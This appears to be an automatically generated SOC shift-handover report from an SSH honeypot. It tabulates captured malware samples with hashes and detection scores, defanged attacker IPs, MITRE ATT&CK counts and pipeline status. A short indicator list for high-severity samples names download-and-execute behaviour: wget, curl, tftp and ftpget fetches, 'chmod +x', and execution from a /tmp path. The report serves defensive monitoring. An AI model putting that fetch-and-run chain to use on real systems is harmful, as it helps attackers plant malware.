| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.53.235[.]100` | BE | Google LLC | **100** ⚠️ | 0 |
| `87.117.32[.]22` | RU | OJSC Rostelecom Macroregional Branch South | **100** ⚠️ | 50 |
| `102.220.160[.]47` | SI | Internet | **100** ⚠️ | 48 |
| `112.28.73[.]142` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `130.12.182[.]225` | DE | Netiface LLC | **100** ⚠️ | 31 |
| `178.178.194[.]137` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `172.236.228[.]222` | US | Linode | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `66.240.223[.]208` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `45.156.87[.]182` | NL | TechTies Inc. | **100** ⚠️ | 27 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 174 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 165 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |

---

## 🔕 False Positive Summary (99 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 88 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 365 cases |
| Tool 34  | Credential Extractor        | ✅ 192 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 19 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 151 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 99 filtered (27.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 85 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 165 priority case(s) shown individually · 42 recon entry/entries in table (14 group(s) consolidating 73 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-05T10:40:50Z_
